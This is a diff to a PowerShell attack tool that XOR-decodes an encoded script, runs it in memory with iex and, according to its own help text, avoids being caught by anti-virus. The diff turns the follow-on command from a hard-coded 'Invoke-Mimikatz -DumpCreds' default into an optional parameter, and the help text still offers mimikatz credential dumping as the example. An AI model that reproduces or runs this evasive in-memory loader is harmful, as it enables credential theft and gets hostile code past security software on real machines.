@@ -95,11 +95,12 @@ XOR encodes a script into a format that will not be caught by Anti-Virus.
 
 .PARAMETER InputScript
 
-The input file to encode.
+The input file to decode and run in-memory decoded  (defaults to Encoded.txt).
 
 .PARAMETER PassFunctionParamaters
 
-The Output file to write the encoded value to (defaults to Encoded.txt)
+Optionally provide additional commands to run such as 'invoke-mimikatz -dumpcreds, useful when running
+on a non-interactive prompt (started WMI task)'
 
 .Paramater XORValue
 
@@ -138,7 +139,7 @@ mimikatz(powershell) # coffee
 		[string]$InputScript = "Encoded.txt",
 			
 		[Parameter(Mandatory=$false)]
-		[string]$PassFunctionParamaters = "Invoke-Mimikatz -DumpCreds",
+		[string]$PassFunctionParamaters,
 			
 		[Parameter(Mandatory=$false)]
 		[int]$XORValue = 111
@@ -152,5 +153,8 @@ mimikatz(powershell) # coffee
     
     $String = [System.Text.Encoding]::ASCII.GetString($bytes)
     iex $String;
-    iex $PassFunctionParamaters
+    if ($PassFunctionParamaters)
+    {
+    	iex $PassFunctionParamaters;
+    }
 }
